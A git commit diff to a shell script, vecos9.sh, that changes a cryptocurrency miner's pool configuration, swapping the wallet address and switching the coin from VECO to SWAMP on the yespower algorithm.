1c95d4c2ac426db1e08696506e2703dc7192fd18
barburonjilo <barburonjilo@outlook.co.id>
2025-05-09 19:36:17 +0700

    Update vecos9.sh

--- vecos9.sh
+++ vecos9.sh
@@ -12,8 +12,8 @@ while true; do
   cat > config.json <<END
 {
   "url": "45.115.225.131:443",
-  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker9",
-  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
+   "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ.worker9",
+  "pass": "c=SWAMP,m=solo,zap=SWAMP,mc=SWAMP",
   "threads": 6,
   "algo": "yespower"
 }
